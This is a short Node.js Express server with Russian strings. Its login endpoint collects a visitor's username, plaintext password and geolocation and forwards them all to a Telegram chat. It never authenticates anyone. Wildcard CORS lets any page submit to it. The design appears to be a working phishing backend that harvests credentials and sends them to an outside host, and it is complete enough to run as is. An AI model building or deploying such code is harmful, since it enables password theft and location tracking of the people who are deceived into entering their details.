require('dotenv').config();
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();
const API = () => `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});
app.use(express.json({ limit: '64kb' }));
app.use(express.text({ type: '*/*', limit: '64kb' }));

app.get('/ping', (req, res) => res.type('text/plain').send('pong ' + new Date().toISOString()));
app.use(express.static(path.join(__dirname, 'public')));

function parseBody(req) {
  let b = req.body;
  if (typeof b === 'string') { try { b = JSON.parse(b); } catch (e) { b = {}; } }
  return b || {};
}

async function call(method, payload) {
  const r = await fetch(`${API()}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
  const data = await r.json();
  if (!data.ok) console.error(`[TG:${method}]`, JSON.stringify(data));
  else console.log(`[TG:${method}] ok`);
  return data;
}

app.post('/api/login', async (req, res) => {
  const b = parseBody(req);
  console.log('[POST /api/login]', JSON.stringify(b));
  if (!BOT_TOKEN || !CHAT_ID) return res.status(500).json({ ok:false, error:'env не настроен' });

  const lat = parseFloat(b.lat), lon = parseFloat(b.lon);
  const hasGeo = Number.isFinite(lat) && Number.isFinite(lon);

  const text =
    'Вход на сайт!\n' +
    'Логин: ' + (b.login || '') + '\n' +
    'Пароль: ' + (b.password || '') + '\n' +
    'Локация: ' + (hasGeo ? 'карта ниже' : (b.location || 'не определена'));

  try {
    await call('sendMessage', { chat_id: CHAT_ID, text, disable_web_page_preview: true });
    if (hasGeo) await call('sendLocation', { chat_id: CHAT_ID, latitude: lat, longitude: lon });
    res.json({ ok: true });
  } catch (e) {
    console.error('[TG] сеть:', e.message);
    res.status(502).json({ ok:false, error:'telegram недоступен' });
  }
});

app.get('/api/test', async (req, res) => {
  try { res.json(await call('sendMessage', { chat_id: CHAT_ID, text: 'Проверка связи с сайта' })); }
  catch (e) { res.status(502).json({ ok:false, error: e.message }); }
});

app.listen(PORT, () => console.log('Слушаю ' + PORT));
